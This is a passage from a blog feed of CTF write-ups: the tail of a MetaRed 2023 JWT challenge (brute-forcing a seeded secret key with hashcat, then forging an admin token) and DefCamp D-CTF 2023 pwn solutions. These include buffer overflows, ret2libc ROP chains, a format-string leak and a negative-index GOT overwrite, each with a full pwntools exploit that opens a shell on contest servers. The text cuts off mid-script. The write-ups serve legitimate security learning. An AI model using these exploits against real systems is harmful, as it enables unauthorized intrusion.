it‚Äôs fixed the value of <code>algorithms=[&#39;HS256&#39;]</code> when decoding.</li><li>I could have tried this if the algorithm wasn‚Äôt fixed.</li></ul></li><li>try to find <code>app.secret_key</code>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line">random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>If I know the seed, I can know the random value. It‚Äôs not completely random. The number of cases is only 1001.</li><li>I used the hashcat to find the <code>key</code> of jwt token created using the <code>HS256</code> algorithm. For this, I needed to write a script to create the key candidate list. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">    random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>Finally I got the list for hashcat!</p><ul><li><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibm9uIHByaXZpbGVnZWQifQ.SmQA4Ic4hOGFRD4hdRuuact9gwKRZZwI3zpEgBnjocw ./list</span><br></pre></td></tr></table></figure></li></ul><p>The <code>-m</code> means hash modes, 16500 is JWT (JSON Web Token). Now I know the <code>app.secret_key</code> from the result. It was <code>Sup3S4f3472520232207</code>.</p><p>I used this site for create jwt token.</p><ul><li><a href="https://jwt.io/">https://jwt.io/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>Just connect and receive a jwt token in response.</li><li>Infer the key used for encoding using the obtained jwt token and hashcat.</li><li>Change the <code>user</code> value to admin, create a new jwt token, and send it.</li></ol><img src="/images/231027-metared2023-master_jwt/1.png" width=700/><br>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> MetaRed </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)</title>
      <link href="/231023-d-ctf2023-ALL_PWN/"/>
      <url>/231023-d-ctf2023-ALL_PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2106">https://ctftime.org/event/2106</a></li></ul><h2 id="baby-bof-105-solves-x2F-10-points"><a href="#baby-bof-105-solves-x2F-10-points" class="headerlink" title="baby-bof (105 solves &#x2F; 10 points)"></a>baby-bof (105 solves &#x2F; 10 points)</h2><blockquote><p>This is a basic buffer overflow.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p></blockquote><p>Simple buffer overflow from <code>gets</code>. I simply jumped to <code>flag</code>.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.182.195&#x27;, 31670)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x130</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x400767</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bistro-67-solves-x2F-12-points"><a href="#bistro-67-solves-x2F-12-points" class="headerlink" title="bistro (67 solves &#x2F; 12 points)"></a>bistro (67 solves &#x2F; 12 points)</h2><blockquote><p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>My decompiler didn‚Äôt work well, so I used an online decompiler. </p><ul><li><a href="https://dogbolt.org/">https://dogbolt.org/</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">custom</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose what you want to eat:&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4005E0: using guessed type __int64 __fastcall gets(_QWORD);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (000000000040076C) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;              MENU             &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Custom dinner............10$&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    custom();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is part of what Hexray decompiled. I can find simple buffer overflow from <code>custom</code>. The challenge didn‚Äôt give player a libc, so I need to find libc address. Fortunately, there is no PIE. :)</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><ul><li>Remember to return to the main when you leak libc address.</li><li>If the stack is not aligned, you can add a <code>ret</code> assembly.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.89.133.49&#x27;</span>,<span class="number">30310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bistro-v2-72-solves-x2F-10-points"><a href="#bistro-v2-72-solves-x2F-10-points" class="headerlink" title="bistro-v2 (72 solves &#x2F; 10 points)"></a>bistro-v2 (72 solves &#x2F; 10 points)</h2><blockquote><p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>This challenge is similar to bistro. But simple logic is added.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> not_flag; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> flag; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;flag, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the restaurant V2!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(buff, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);   <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Show me your ticket to pass: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;not_flag);</span><br><span class="line">    <span class="keyword">if</span> ( flag == not_flag )</span><br><span class="line">      restaurant();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Permission denied!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I need a ticket(flag) for a <code>restaurant</code>. But how to know <code>flag</code>? The <code>flag</code> is from <code>/dev/urandom</code>. I obviously can‚Äôt predict this. But I can leak this from stack. Because there is a <code>format string bug(fsb)</code>! </p><p>The <code>flag</code> is stored on the stack. So I can leak this using <code>fsb</code>. If I leaked the required <code>flag</code>, the challenge is already over. (The rest is the same as the previous <code>bistro</code>.)</p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant-v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.141.71.230&#x27;</span>, <span class="number">31837</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant-v2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ticket = p.recvline()</span><br><span class="line">info(ticket)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, ticket)</span><br><span class="line"></span><br><span class="line"><span class="comment"># same as before</span></span><br><span class="line">ret = <span class="number">0x00000000004006ae</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400b33</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;restaurant&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc.address = printf_got - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="book-39-solves-x2F-247-points"><a href="#book-39-solves-x2F-247-points" class="headerlink" title="book (39 solves &#x2F; 247 points)"></a>book (39 solves &#x2F; 247 points)</h2><blockquote><p>Read books for inspiration so you know what to write!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>Until I decompiled, I thought this challenge might be heap related. But I was completely wrong. lol</p><p>There are 6 methods, but I only focused on 2(<code>print_todo</code>, <code>store_todo</code>). </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which entry would you like to read? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your NOTE: %s\n&quot;</span>, &amp;todos[<span class="number">48</span> * v1]); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I always pay attention whenever I see an index. It can refer to memory you didn‚Äôt intend. </p><img src="/images/231023-d-ctf2023-ALL_PWN/book01.png" width=700/><br><p>The index 0 starts at 0x555555558140. For debugging convenience, I put AAAA at index 0. :)<br>I can put the index as a negative number, so I can leak the got address.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In which slot would you like to store the new entry? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your NOTE? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read_line(&amp;todos[<span class="number">48</span> * v1], <span class="number">48LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The same vulnerability as the previous function(<code>print_todo</code>) occurs. But this time, I can overwrite the address. </p><p>I decided to overwrite <code>atoi</code> with <code>system</code>. The <code>atoi</code> is good to overwrite <code>system</code>. Becuase It has an argument of pointer. </p><p>And luckily it‚Äôs located next to <code>open_got</code>. I can simply put <code>open_got</code> and <code>system_addr</code>. :)</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">32692</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./book&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_entry</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_entry</span>(<span class="params">idx,note</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, note)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;AAAA&#x27;</span>) <span class="comment"># for debugging</span></span><br><span class="line"></span><br><span class="line">print_entry(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;E: &#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;open_got: &#x27;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="comment">#system = leak - 0xc3960</span></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line">system = leak -<span class="number">0xbba50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(leak)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;-4&#x27;</span>, payload )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span 